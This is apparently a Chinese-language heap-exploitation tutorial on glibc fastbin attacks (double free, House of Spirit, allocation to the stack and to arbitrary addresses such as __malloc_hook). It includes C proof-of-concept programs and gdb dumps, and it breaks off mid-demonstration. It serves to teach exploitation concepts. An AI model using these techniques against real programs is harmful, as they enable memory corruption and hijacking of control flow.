<h2 id="_1">介绍<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>fastbin attack 是一类漏洞的利用方法，是指所有基于 fastbin 机制的漏洞利用方法。这类利用的前提是：</p>
<ul>
<li>存在堆溢出、use-after-free 等能控制 chunk 内容的漏洞</li>
<li>漏洞发生于 fastbin 类型的 chunk 中</li>
</ul>
<p>如果细分的话，可以做如下的分类：</p>
<ul>
<li>Fastbin Double Free</li>
<li>House of Spirit</li>
<li>Alloc to Stack</li>
<li>Arbitrary Alloc</li>
</ul>
<p>其中，前两种主要漏洞侧重于利用 <code>free</code> 函数释放<strong>真的 chunk 或伪造的 chunk</strong>，然后再次申请 chunk 进行攻击，后两种侧重于故意修改 <code>fd</code> 指针，直接利用 <code>malloc</code> 申请指定位置 chunk 进行攻击。</p>
<h2 id="_2">原理<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p>fastbin attack 存在的原因在于 fastbin 是使用单链表来维护释放的堆块的，并且由 fastbin 管理的 chunk 即使被释放，其 next_chunk 的 prev_inuse 位也不会被清空。
我们来看一下 fastbin 是怎样管理空闲 chunk 的。
<div class="codehilite"><pre><span></span>int main(void)
{
    void *chunk1,*chunk2,*chunk3;
    chunk1=malloc(0x30);
    chunk2=malloc(0x30);
    chunk3=malloc(0x30);
    //进行释放
    free(chunk1);
    free(chunk2);
    free(chunk3);
    return 0;
}
</pre></div>
释放前
<div class="codehilite"><pre><span></span>0x602000:   0x0000000000000000  0x0000000000000041 &lt;=== chunk1
0x602010:   0x0000000000000000  0x0000000000000000
0x602020:   0x0000000000000000  0x0000000000000000
0x602030:   0x0000000000000000  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000000041 &lt;=== chunk2
0x602050:   0x0000000000000000  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000000000
0x602070:   0x0000000000000000  0x0000000000000000
0x602080:   0x0000000000000000  0x0000000000000041 &lt;=== chunk3
0x602090:   0x0000000000000000  0x0000000000000000
0x6020a0:   0x0000000000000000  0x0000000000000000
0x6020b0:   0x0000000000000000  0x0000000000000000
0x6020c0:   0x0000000000000000  0x0000000000020f41 &lt;=== top chunk
</pre></div>
执行三次 free 进行释放后
<div class="codehilite"><pre><span></span>0x602000:   0x0000000000000000  0x0000000000000041 &lt;=== chunk1
0x602010:   0x0000000000000000  0x0000000000000000
0x602020:   0x0000000000000000  0x0000000000000000
0x602030:   0x0000000000000000  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000000041 &lt;=== chunk2
0x602050:   0x0000000000602000  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000000000
0x602070:   0x0000000000000000  0x0000000000000000
0x602080:   0x0000000000000000  0x0000000000000041 &lt;=== chunk3
0x602090:   0x0000000000602040  0x0000000000000000
0x6020a0:   0x0000000000000000  0x0000000000000000
0x6020b0:   0x0000000000000000  0x0000000000000000
0x6020c0:   0x0000000000000000  0x0000000000020f41 &lt;=== top chunk
</pre></div>
此时位于 main_arena 中的 fastbin 链表中已经储存了指向 chunk3 的指针，并且 chunk 3、2、1构成了一个单链表
<div class="codehilite"><pre><span></span>Fastbins[idx=2, size=0x30,ptr=0x602080]
===&gt;Chunk(fd=0x602040, size=0x40, flags=PREV_INUSE)
===&gt;Chunk(fd=0x602000, size=0x40, flags=PREV_INUSE)
===&gt;Chunk(fd=0x000000, size=0x40, flags=PREV_INUSE) 
</pre></div>
我们可以使用如下的图片来表示这一点
<img alt="" src="../../../pwn/heap/figure/fastbin_link_list.png" /></p>
<h2 id="fastbin-double-free">Fastbin Double Free<a class="headerlink" href="#fastbin-double-free" title="Permanent link">&para;</a></h2>
<h3 id="_3">介绍<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
<p>Fastbin Double Free 是指 fastbin 的 chunk 可以被多次释放，因此可以在 fastbin 链表中存在多次。这样导致的后果是多次分配可以从 fastbin 链表中取出同一个堆块，相当于多个指针指向同一个堆块，结合堆块的数据内容可以实现类似于类型混淆(type confused)的效果。</p>
<p>Fastbin Double Free 能够成功利用主要有两部分的原因</p>
<ol>
<li>fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空</li>
<li>fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。</li>
</ol>
<div class="codehilite"><pre><span></span>/* Another simple check: make sure the top of the bin is not the
       record we are going to add (i.e., double free).  */
    if (__builtin_expect (old == p, 0))
      {
        errstr = &quot;double free or corruption (fasttop)&quot;;
        goto errout;
}
</pre></div>

<h3 id="_4">演示<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
<p>下面的示例程序说明了这一点，当我们试图执行以下代码时</p>
<p><div class="codehilite"><pre><span></span>int main(void)
{
    void *chunk1,*chunk2,*chunk3;
    chunk1=malloc(0x10);
    chunk2=malloc(0x10);

    free(chunk1);
    free(chunk1);
    return 0;
}
</pre></div>
如果你执行这个程序，不出意外的话会得到如下的结果，这正是 _int_free 函数检测到了 fastbin 的 double free。
<div class="codehilite"><pre><span></span>*** Error in `./tst&#39;: double free or corruption (fasttop): 0x0000000002200010 ***
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7fbb7a36c7e5]
/lib/x86_64-linux-gnu/libc.so.6(+0x8037a)[0x7fbb7a37537a]
/lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7fbb7a37953c]
./tst[0x4005a2]
/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7fbb7a315830]
./tst[0x400499]
======= Memory map: ========
00400000-00401000 r-xp 00000000 08:01 1052570                            /home/Ox9A82/tst/tst
00600000-00601000 r--p 00000000 08:01 1052570                            /home/Ox9A82/tst/tst
00601000-00602000 rw-p 00001000 08:01 1052570                            /home/Ox9A82/tst/tst
02200000-02221000 rw-p 00000000 00:00 0                                  [heap]
7fbb74000000-7fbb74021000 rw-p 00000000 00:00 0 
7fbb74021000-7fbb78000000 ---p 00000000 00:00 0 
7fbb7a0df000-7fbb7a0f5000 r-xp 00000000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7fbb7a0f5000-7fbb7a2f4000 ---p 00016000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7fbb7a2f4000-7fbb7a2f5000 rw-p 00015000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7fbb7a2f5000-7fbb7a4b5000 r-xp 00000000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7fbb7a4b5000-7fbb7a6b5000 ---p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7fbb7a6b5000-7fbb7a6b9000 r--p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7fbb7a6b9000-7fbb7a6bb000 rw-p 001c4000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7fbb7a6bb000-7fbb7a6bf000 rw-p 00000000 00:00 0 
7fbb7a6bf000-7fbb7a6e5000 r-xp 00000000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7fbb7a8c7000-7fbb7a8ca000 rw-p 00000000 00:00 0 
7fbb7a8e1000-7fbb7a8e4000 rw-p 00000000 00:00 0 
7fbb7a8e4000-7fbb7a8e5000 r--p 00025000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7fbb7a8e5000-7fbb7a8e6000 rw-p 00026000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7fbb7a8e6000-7fbb7a8e7000 rw-p 00000000 00:00 0 
7ffcd2f93000-7ffcd2fb4000 rw-p 00000000 00:00 0                          [stack]
7ffcd2fc8000-7ffcd2fca000 r--p 00000000 00:00 0                          [vvar]
7ffcd2fca000-7ffcd2fcc000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
已放弃 (核心已转储)
</pre></div>
如果我们在 chunk1 释放后，再释放 chunk2 ，这样 main_arena 就指向 chunk2 而不是 chunk1 了，此时我们再去释放 chunk1 就不再会被检测到。
<div class="codehilite"><pre><span></span>int main(void)
{
    void *chunk1,*chunk2,*chunk3;
    chunk1=malloc(0x10);
    chunk2=malloc(0x10);

    free(chunk1);
    free(chunk2);
    free(chunk1);
    return 0;
}
</pre></div>
第一次释放<code>free(chunk1)</code></p>
<p><img alt="" src="../../../pwn/heap/figure/fastbin_free_chunk1.png" /></p>
<p>第二次释放<code>free(chunk2)</code></p>
<p><img alt="" src="../../../pwn/heap/figure/fastbin_free_chunk2.png" /></p>
<p>第三次释放<code>free(chunk1)</code></p>
<p><img alt="" src="../../../pwn/heap/figure/fastbin_free_chunk3.png" /></p>
<p>注意因为 chunk1 被再次释放因此其 fd 值不再为 0 而是指向 chunk2，这时如果我们可以控制 chunk1 的内容，便可以写入其 fd 指针从而实现在我们想要的任意地址分配 fastbin 块。
下面这个示例演示了这一点，首先跟前面一样构造 main_arena=&gt;chunk1=&gt;chun2=&gt;chunk1的链表。之后第一次调用 malloc 返回 chunk1 之后修改 chunk1 的 fd 指针指向 bss 段上的 bss_chunk，之后我们可以看到 fastbin 会把堆块分配到这里。</p>
<p><div class="codehilite"><pre><span></span>typedef struct _chunk
{
    long long pre_size;
    long long size;
    long long fd;
    long long bk;  
} CHUNK,*PCHUNK;

CHUNK bss_chunk;

int main(void)
{
    void *chunk1,*chunk2,*chunk3;
    void *chunk_a,*chunk_b;

    bss_chunk.size=0x21;
    chunk1=malloc(0x10);
    chunk2=malloc(0x10);

    free(chunk1);
    free(chunk2);
    free(chunk1);

    chunk_a=malloc(0x10);
    *(long long *)chunk_a=&amp;bss_chunk;
    malloc(0x10);
    malloc(0x10);
    chunk_b=malloc(0x10);
    printf(&quot;%p&quot;,chunk_b);
    return 0;
}
</pre></div>
在我的系统上 chunk_b 输出的值会是 0x601090，这个值位于bss段中正是我们之前设置的<code>CHUNK bss_chunk</code>
<div class="codehilite"><pre><span></span>Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/Ox9A82/tst/tst
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/Ox9A82/tst/tst
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/Ox9A82/tst/tst
0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]

0x601080 &lt;bss_chunk&gt;:   0x0000000000000000  0x0000000000000021
0x601090 &lt;bss_chunk+16&gt;:0x0000000000000000  0x0000000000000000
0x6010a0:               0x0000000000000000  0x0000000000000000
0x6010b0:               0x0000000000000000  0x0000000000000000
0x6010c0:               0x0000000000000000  0x0000000000000000
</pre></div>
值得注意的是，我们在 main 函数的第一步就进行了<code>bss_chunk.size=0x21;</code>的操作，这是因为_int_malloc会对欲分配位置的 size 域进行验证，如果其 size 与当前 fastbin 链表应有 size 不符就会抛出异常。
<div class="codehilite"><pre><span></span>*** Error in `./tst&#39;: malloc(): memory corruption (fast): 0x0000000000601090 ***
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7f8f9deb27e5]
/lib/x86_64-linux-gnu/libc.so.6(+0x82651)[0x7f8f9debd651]
/lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7f8f9debf184]
./tst[0x400636]
/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f8f9de5b830]
./tst[0x4004e9]
======= Memory map: ========
00400000-00401000 r-xp 00000000 08:01 1052570                            /home/Ox9A82/tst/tst
00600000-00601000 r--p 00000000 08:01 1052570                            /home/Ox9A82/tst/tst
00601000-00602000 rw-p 00001000 08:01 1052570                            /home/Ox9A82/tst/tst
00bc4000-00be5000 rw-p 00000000 00:00 0                                  [heap]
7f8f98000000-7f8f98021000 rw-p 00000000 00:00 0 
7f8f98021000-7f8f9c000000 ---p 00000000 00:00 0 
7f8f9dc25000-7f8f9dc3b000 r-xp 00000000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7f8f9dc3b000-7f8f9de3a000 ---p 00016000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7f8f9de3a000-7f8f9de3b000 rw-p 00015000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7f8f9de3b000-7f8f9dffb000 r-xp 00000000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7f8f9dffb000-7f8f9e1fb000 ---p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7f8f9e1fb000-7f8f9e1ff000 r--p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7f8f9e1ff000-7f8f9e201000 rw-p 001c4000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7f8f9e201000-7f8f9e205000 rw-p 00000000 00:00 0 
7f8f9e205000-7f8f9e22b000 r-xp 00000000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7f8f9e40d000-7f8f9e410000 rw-p 00000000 00:00 0 
7f8f9e427000-7f8f9e42a000 rw-p 00000000 00:00 0 
7f8f9e42a000-7f8f9e42b000 r--p 00025000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7f8f9e42b000-7f8f9e42c000 rw-p 00026000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7f8f9e42c000-7f8f9e42d000 rw-p 00000000 00:00 0 
7fff71a94000-7fff71ab5000 rw-p 00000000 00:00 0                          [stack]
7fff71bd9000-7fff71bdb000 r--p 00000000 00:00 0                          [vvar]
7fff71bdb000-7fff71bdd000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
已放弃 (核心已转储)
</pre></div>
_int_malloc 中的校验如下
<div class="codehilite"><pre><span></span>if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
    {
      errstr = &quot;malloc(): memory corruption (fast)&quot;;
    errout:
      malloc_printerr (check_action, errstr, chunk2mem (victim));
      return NULL;
}
</pre></div></p>
<h3 id="_5">小总结<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
<p>通过 fastbin double free 我们可以使用多个指针控制同一个堆块，这可以用于篡改一些堆块中的关键数据域或者是实现类似于类型混淆的效果。
如果更进一步修改 fd 指针，则能够实现任意地址分配堆块的效果( 首先要通过验证 )，这就相当于任意地址写任意值的效果。</p>
<h2 id="house-of-spirit">House Of Spirit<a class="headerlink" href="#house-of-spirit" title="Permanent link">&para;</a></h2>
<h3 id="_6">介绍<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
<p>House of Spirit 是 <code>the Malloc Maleficarum</code> 中的一种技术。</p>
<p>该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配<strong>指定地址</strong>的 chunk 的目的。</p>
<p>要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即</p>
<ul>
<li>fake chunk 的 ISMMAP 位不能为1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</li>
<li>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</li>
<li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。</li>
<li>fake chunk 的 next chunk 的大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code> 。</li>
<li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</li>
</ul>
<p>至于为什么要绕过这些检测，可以参考 free 部分的源码。</p>
<h3 id="_7">演示<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
<p>这里就直接以 how2heap 上的例子进行说明，如下</p>
<div class="codehilite"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;This file demonstrates the house of spirit attack.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Calling malloc() once so that it sets up its memory.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;We will now overwrite a pointer to point to a fake &#39;fastbin&#39; region.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="n">a</span><span class="p">;</span>
    <span class="c1">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">fake_chunks</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="n">__attribute__</span> <span class="p">((</span><span class="n">aligned</span> <span class="p">(</span><span class="mi">16</span><span class="p">)));</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">fake_chunks</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">fake_chunks</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">fake_chunks</span><span class="p">[</span><span class="mi">7</span><span class="p">]);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. </span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">fake_chunks</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x40</span><span class="p">;</span> <span class="c1">// this is the size</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
        <span class="c1">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span>
    <span class="n">fake_chunks</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x1234</span><span class="p">;</span> <span class="c1">// nextsize</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">fake_chunks</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">a</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">fake_chunks</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Freeing the overwritten pointer.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">fake_chunks</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">fake_chunks</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;malloc(0x30): %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x30</span><span class="p">));</span>
<span class="p">}</span>
</pre></div>

<p>运行后的效果如下</p>
<div class="codehilite"><pre><span></span>➜  how2heap git:<span class="o">(</span>master<span class="o">)</span> ./house_of_spirit 
This file demonstrates the house of spirit attack.
Calling malloc<span class="o">()</span> once so that it sets up its memory.
We will now overwrite a pointer to point to a fake <span class="s1">&#39;fastbin&#39;</span> region.
This region <span class="o">(</span>memory of length: <span class="m">80</span><span class="o">)</span> contains two chunks. The first starts at 0x7ffd9bceaa58 and the second at 0x7ffd9bceaa88.
This chunk.size of this region has to be <span class="m">16</span> more than the region <span class="o">(</span>to accomodate the chunk data<span class="o">)</span> <span class="k">while</span> still falling into the fastbin category <span class="o">(</span>&lt;<span class="o">=</span> <span class="m">128</span> on x64<span class="o">)</span>. The PREV_INUSE <span class="o">(</span>lsb<span class="o">)</span> bit is ignored by free <span class="k">for</span> fastbin-sized chunks, however the IS_MMAPPED <span class="o">(</span>second lsb<span class="o">)</span> and NON_MAIN_ARENA <span class="o">(</span>third lsb<span class="o">)</span> bits cause problems.
... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work <span class="k">for</span> the malloc parameter at the end. 
The chunk.size of the *next* fake region has to be sane. That is &gt; <span class="m">2</span>*SIZE_SZ <span class="o">(</span>&gt; <span class="m">16</span> on x64<span class="o">)</span> <span class="o">&amp;&amp;</span> &lt; av-&gt;system_mem <span class="o">(</span>&lt; 128kb by default <span class="k">for</span> the main arena<span class="o">)</span> to pass the nextsize integrity checks. No need <span class="k">for</span> fastbin size.
Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffd9bceaa58.
... note that the memory address of the *region* associated with this chunk must be <span class="m">16</span>-byte aligned.
Freeing the overwritten pointer.
Now the next malloc will <span class="k">return</span> the region of our fake chunk at 0x7ffd9bceaa58, which will be 0x7ffd9bceaa60!
malloc<span class="o">(</span>0x30<span class="o">)</span>: 0x7ffd9bceaa60
</pre></div>

<h3 id="_8">小总结<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h3>
<p>可以看出，想要使用该技术分配 chunk 到指定地址，其实并不需要修改指定地址的任何内容，<strong>关键是要能够修改指定地址的前后的内容使其可以绕过对应的检测</strong>。</p>
<h2 id="alloc-to-stack">Alloc to Stack<a class="headerlink" href="#alloc-to-stack" title="Permanent link">&para;</a></h2>
<h3 id="_9">介绍<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h3>
<p>如果你已经理解了前文所讲的 Fastbin Double Free 与 house of spirit 技术，那么理解该技术就已经不成问题了，它们的本质都在于 fastbin 链表的特性：当前 chunk 的 fd 指针指向下一个 chunk。</p>
<p>该技术的核心点在于劫持 fastbin 链表中 chunk 的 fd 指针，把 fd 指针指向我们想要分配的栈上，从而实现控制栈中的一些关键数据，比如返回地址等。</p>
<h3 id="_10">演示<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h3>
<p>这次我们把 fake_chunk 置于栈中称为 stack_chunk，同时劫持了 fastbin 链表中 chunk 的 fd 值，通过把这个 fd 值指向 stack_chunk 就可以实现在栈中分配 fastbin chunk。
<div class="codehilite"><pre><span></span>typedef struct _chunk
{
    long long pre_size;
    long long size;
    long long fd;
    long long bk;  
} CHUNK,*PCHUNK;

int main(void)
{
    CHUNK stack_chunk;

    void *chunk1;
    void *chunk_a;

    stack_chunk.size=0x21;
    chunk1=malloc(0x10);

    free(chunk1);

    *(long long *)chunk1=&amp;stack_chunk;
    malloc(0x10);
    chunk_a=malloc(0x10);
    return 0;
}
</pre></div>
通过 gdb 调试可以看到我们首先把 chunk1 的 fd 指针指向了 stack_chunk
<div class="codehilite"><pre><span></span>0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk1
0x602010:   0x00007fffffffde60  0x0000000000000000
0x602020:   0x0000000000000000  0x0000000000020fe1 &lt;=== top chunk
</pre></div>
之后第一次 malloc 使得 fastbin 链表指向了 stack_chunk，这意味着下一次分配会使用 stack_chunk 的内存进行
<div class="codehilite"><pre><span></span>0x7ffff7dd1b20 &lt;main_arena&gt;:    0x0000000000000000 &lt;=== unsorted bin
0x7ffff7dd1b28 &lt;main_arena+8&gt;:  0x00007fffffffde60 &lt;=== fastbin[0]
0x7ffff7dd1b30 &lt;main_arena+16&gt;: 0x0000000000000000  
</pre></div>
最终第二次malloc返回值为0x00007fffffffde70也就是stack_chunk
<div class="codehilite"><pre><span></span>   0x400629 &lt;main+83&gt;        call   0x4004c0 &lt;malloc@plt&gt;
 → 0x40062e &lt;main+88&gt;        mov    QWORD PTR [rbp-0x38], rax
   $rax   : 0x00007fffffffde70

0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/Ox9A82/tst/tst
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/Ox9A82/tst/tst
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/Ox9A82/tst/tst
0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]
0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw- 
0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw- 
0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw- 
0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- 
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
</pre></div></p>
<h3 id="_11">小总结<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h3>
<p>通过该技术我们可以把 fastbin chunk 分配到栈中，从而控制返回地址等关键数据。要实现这一点我们需要劫持fastbin 中 chunk 的 fd 域，把它指到栈上，当然同时需要栈上存在有满足条件的size值。</p>
<h2 id="arbitrary-alloc">Arbitrary Alloc<a class="headerlink" href="#arbitrary-alloc" title="Permanent link">&para;</a></h2>
<h3 id="_12">介绍<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h3>
<p>Arbitrary Alloc 其实与 Alloc to stack 是完全相同的，唯一的区别是分配的目标不再是栈中。
事实上只要满足目标地址存在合法的 size 域（这个 size 域是构造的，还是自然存在的都无妨），我们可以把 chunk 分配到任意的可写内存中，比如bss、heap、data、stack等等。</p>
<h3 id="_13">演示<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h3>
<p>在这个例子，我们使用字节错位来实现直接分配 fastbin 到<strong>_malloc_hook的位置，相当于覆盖_malloc_hook来控制程序流程。</strong>
<div class="codehilite"><pre><span></span>int main(void)
{


    void *chunk1;
    void *chunk_a;

    chunk1=malloc(0x60);

    free(chunk1);

    *(long long *)chunk1=0x7ffff7dd1b05;
    malloc(0x60);
    chunk_a=malloc(0x60);
    return 0;
}
</pre></div>
这里的0x7ffff7dd1b05是我根据本机的情况得出的值，这个值是怎么获得的呢？首先我们要观察欲写入地址附近是否存在可以字节错位的情况。
<div class="codehilite"><pre><span></span>0x7ffff7dd1a88 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1a90 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1a98 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1aa0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1aa8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
